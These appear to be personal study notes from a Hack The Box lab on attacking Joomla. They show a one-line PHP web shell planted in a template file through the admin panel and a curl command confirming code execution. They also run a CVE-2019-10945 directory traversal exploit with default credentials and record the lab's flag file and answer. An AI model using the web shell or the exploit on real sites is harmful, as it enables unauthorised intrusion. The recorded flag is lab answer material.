---
description: >-
  Joomla has had its fair share of vulnerabilities against the core application
  and vulnerable extensions. (possible to gain remote code execution if we can
  log in to the admin backend.)
---

# Attacking Joomla

## Abusing Built-In Functionality

Log in to the admin control panel using credentials found whether by leak or brute force. After logging in&#x20;

we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_admin.png" alt=""><figcaption><p>Control Panel</p></figcaption></figure>

Access Templates (Under Configuration)

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_templates.png" alt=""><figcaption></figcaption></figure>

Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_customise.png" alt=""><figcaption><p>Choose page from the left panel</p></figcaption></figure>

<figure><img src="https://academy.hackthebox.com/storage/modules/113/joomla_edited.png" alt=""><figcaption><p>error.php</p></figcaption></figure>

add the following to the php file.

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

click on `Save & Close` at the top and confirm code execution using `cURL`.

```shell-session
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Leveraging Known Vulnerabilities

* Most of the Joomla related vulerabilities are Joomla extensions
* Find vulnerabilities specific to the version running on the target

For our example, the Joomla is vulerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) which is a directory traversal and authenticated file deletion vulnerability.

The exploit can be found [here](https://github.com/dpgg101/CVE-2019-10945).

```shell-session
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

## Assessment

Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption><p>3.9.4</p></figcaption></figure>

```
python3 CVE-2019-10945.py --url=http://dev.inlanefreight.local/administrator --username=admin --password=admin --dir=/                                   
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
flag_6470e394cbf6dab6a91682cc8585059b.txt
htaccess.txt
index.php
robots.txt
web.config.txt
```

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption><p>j00mla_c0re_d1rtrav3rsal!</p></figcaption></figure>
